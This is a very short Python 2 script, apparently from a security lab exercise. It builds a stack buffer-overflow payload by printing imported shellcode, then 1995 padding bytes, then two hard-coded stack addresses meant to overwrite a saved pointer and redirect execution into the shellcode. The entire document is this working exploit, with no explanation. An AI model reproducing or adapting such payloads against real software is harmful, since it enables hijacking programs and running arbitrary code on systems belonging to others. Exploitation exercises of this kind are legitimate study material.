from shellcode import shellcode

print shellcode + "\xAA"*1995 + "\xa8\xf3\xfe\xbf" + "\xbc\xfb\xfe\xbf"
